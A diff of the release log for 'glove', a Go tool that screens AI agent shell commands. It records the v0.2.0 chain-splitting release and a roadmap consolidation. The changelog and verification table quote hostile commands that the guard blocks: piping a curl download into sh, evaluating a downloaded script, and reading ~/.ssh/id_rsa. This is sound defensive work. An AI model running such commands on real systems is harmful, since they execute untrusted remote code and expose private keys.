@@ -1,8 +1,8 @@
 # glove release log and summary
 
-The single place to see where glove stands: what is shipped, what is planned, what each release proves, and how a release is cut. Per-release detail (scope, acceptance criteria, named tests, checklist) lives in [`RELEASE/`](RELEASE/README.md); this file is the readable roll-up and the changelog.
+The single place to see where glove stands: what is shipped, what is planned, what each release proves, and how a release is cut. Per-release detail lives in `RELEASE/vX.Y.Z.md` (status, ACs mapped to named tests, built/limits); this file is the readable roll-up and the changelog.
 
-> **Current state:** v0.1.0 ready (implemented and locally verified; live Claude Code smoke check + tag pending the user). Statuses below are updated when a release changes state, in the same change as the code.
+> **Current state:** v0.2.0 ready (Layer 0+1 implemented and locally verified; live Claude Code smoke check + tag pending the user). Statuses below are updated when a release changes state, in the same change as the code.
 
 ## 1. Summary
 
@@ -12,7 +12,7 @@ glove is a single-binary local guard for AI agent tool calls. Installed at the `
 |---|---|
 | Language / runtime | Go 1.27.3 (`go.mod`, CI `GO_VERSION`, `golang:1.27-alpine` builder), single static binary `CGO_ENABLED=0` |
 | Runtime external dependency | none. Zero network calls on the decision path (PRD §3.3). The Laya GGUF model (~644 MB) is downloaded once at first `serve` with SHA-256 verification (v0.4.0) |
-| Releases planned | 10 (v0.1.0 → v1.0.0, PRD §7) |
+| Releases planned | 7 (v0.1.0 → v1.0.0, PRD §7 — 0.3.0–0.9.0 consolidated to three releases: 0.3.0 audit+policy, 0.4.0 Laya, 0.5.0 adapter matrix, 0.6.0 hardening) |
 | Requirements / ACs | PRD §7 acceptance bullets are the requirements (ids auto-derived as `PRD-<ver>-<n>` by `make ac-map`); v0.1.0: 5 ACs, each governed by ≥ 2 named tests |
 | Licence | Apache-2.0 |
 | Artifacts per tag | tarballs for linux and macOS on amd64 and arm64 (+ `.sha256`), multi-arch image on GHCR, GitHub Release with notes from `RELEASE/<tag>.md`. Windows artifacts join the matrix at v0.9.0 (PRD §8) |
@@ -36,27 +36,30 @@ Newest first.
 | Release | Theme | Status | ACs | Requirements covered |
 |---|---|---|---|---|
 | [v0.1.0](RELEASE/v0.1.0.md) | Claude Code + Layer 0 | ready | 5 (10 tests) | 5/5 (PRD-0.1.0-1…5) |
-| v0.2.0 | Layer 1: chain splitting | planned | - | - |
-| v0.3.0 | Audit log | planned | - | - |
+| [v0.2.0](RELEASE/v0.2.0.md) | Layer 1: chain splitting | ready | 4 (8 tests) | 4/4 (PRD-0.2.0-1…4) |
+| [v0.3.0](RELEASE/v0.3.0.md) | Audit + policy | planned | 9 | 9/9 (PRD-0.3.0-1…9) |
 | v0.4.0 | Layer 2: Laya + `serve` | planned | - | - |
-| v0.5.0 | Kilocode adapter | planned | - | - |
-| v0.6.0 | Codex + OpenCode | planned | - | - |
-| v0.7.0 | Policy engine | planned | - | - |
-| v0.8.0 | Cursor, Gemini CLI, Zed | planned | - | - |
-| v0.9.0 | Release candidate: hardening | planned | - | - |
+| v0.5.0 | Adapter matrix (kilo → codex/opencode → cursor/gemini/zed) | planned | - | - |
+| v0.6.0 | Release candidate: hardening | planned | - | - |
 | v1.0.0 | Production ready (stability marker) | planned | - | - |
 
 ## 3. How a release is cut
 
 1. Write/refresh `RELEASE/vX.Y.Z.md` ACs **before** code (red tests first). One branch per version: `release/0.1.0`, `release/0.2.0`, … (PRD §10.2). No `0.X.0` merges until its predecessor is tagged.
 2. Implement until `make check` is green — fmt-check, vet, ac-map, tests, version-check (CI runs exactly this). Add `make audit` before calling a release ready.
-3. Tick the checklist; update this file (§2/§4/§5), `ROADMAP.md`, `AGENTS.md` and any ADR touched, in the same change.
+3. Tick the release gates; update this file (§2/§4/§5), `ROADMAP.md`, `AGENTS.md` and any ADR touched, in the same change.
 4. Agent hands over a one-line commit message. **User** commits on `release/X.Y.Z`, then runs `make release VERSION=x.y.z`.
-5. CI: gate (`make check`, tag == `VERSION`) → cross-compile build (linux/mac × amd64/arm64, `CGO_ENABLED=0`) → GitHub Release (notes = `RELEASE/<tag>.md`) + multi-arch image on GHCR.
+5. CI: gate (`make check`, tag == `VERSION`) → cross-compile build (linux/mac × amd64/arm64, `CGO_ENABLED=0`) → GitHub Release (notes = `RELEASE/<tag>.md`) + multi-arch image on GHCR; security scans run in parallel on every push.
+
+Versioning: SemVer; `0.x` minors map one-to-one to the PRD §7 roadmap; patches are fixes with no AC change (short note in §4); no `0.X` merges until its predecessor is tagged; `1.0.0` freezes the `contract.Verdict`, CLI, `policy.toml` and audit JSONL schemas.
 
 ## 4. Changelog
 
 Newest first. One paragraph per release: what shipped, what it proves.
+
+### v0.2.0 — Layer 1: chain splitting (ready, untagged)
+
+The engine now understands command composition: a quote-aware splitter (`&&`, `||`, `;`, `|`, `&`, newlines, `$(…)` extraction) feeds segment-level Layer 0 evaluation plus new composition rules (`pipe_to_shell`, `curl_pipe_bash`, `eval_of_download`) over pipe pairs and shell invocations, combined worst-part-wins. `npm test && curl http://x | sh` decomposes and blocks; `ls; git status` sails through; `--explain` shows per-segment verdicts. The 50-case chain fixture splits at 100% (≥ 95% required); hook P95 on the compound payload stays within the 20ms budget. Behavior change vs 0.1.0: `curl|wget … | sh` is now a hard block, not a review.
 
 ### v0.1.0 — Claude Code + Layer 0 (ready, untagged)
 
@@ -68,3 +71,5 @@ Layer 0 shipped end to end: `glove check` for manual verdicts, `glove hook claud
 |---|---|---|
 | Scaffold (2026-11-04) | `go build ./...`, `go test ./...` (contract freeze tests), `glove version` → `0.1.0`, `make check` green locally | Nothing in PRD §7 existed yet at scaffold time |
 | v0.1.0 engine + CLI (2026-11-04, local macOS arm64) | `make check` + `make race` green; 10-case hook fixture set; AC tests 2×5; CLI transcript (block/allow/review, protected paths, PRD §2.2 ssh-config distinction); hook exit codes 0/2 + fail-closed on broken stdin; install flow in a throwaway HOME (diff, backup, idempotency, broken-JSON guard); `doctor --bench hook` median 4.7ms vs 15ms budget | **Live Claude Code session not exercised** (needs install on the user's machine — run before tagging); CI never ran on a tag; linux/windows builds unexercised; govulncheck not installed locally |
+| v0.2.0 Layer 1 (2026-11-04, local macOS arm64) | `make check` + `make race` green; 50-case chain fixture 100% split accuracy + decisions; compound-payload demos (`npm test && curl \| sh` → block with pair findings, `sh -c "$(curl …)"` → eval_of_download, `cat ~/.ssh/id_rsa && ls` → block); subprocess cold-start P95 on the compound payload within 20ms; bench median ~5ms | Same live-session and tag-CI gaps as v0.1.0 (the v0.2.0 tag will be the first run of the fixed workflows: ac-map locale fix, doctor smoke fix, Semgrep registry packs) |
+| Roadmap consolidation (2026-11-04) | PRD §7 rewritten: old 0.3.0–0.9.0 (7 releases) merged into 0.3.0 audit+policy, 0.4.0 Laya (unchanged), 0.5.0 adapter matrix, 0.6.0 hardening; `RELEASE/v0.3.0.md` ACs written before any code; `make ac-map` green against the rewritten PRD | - |
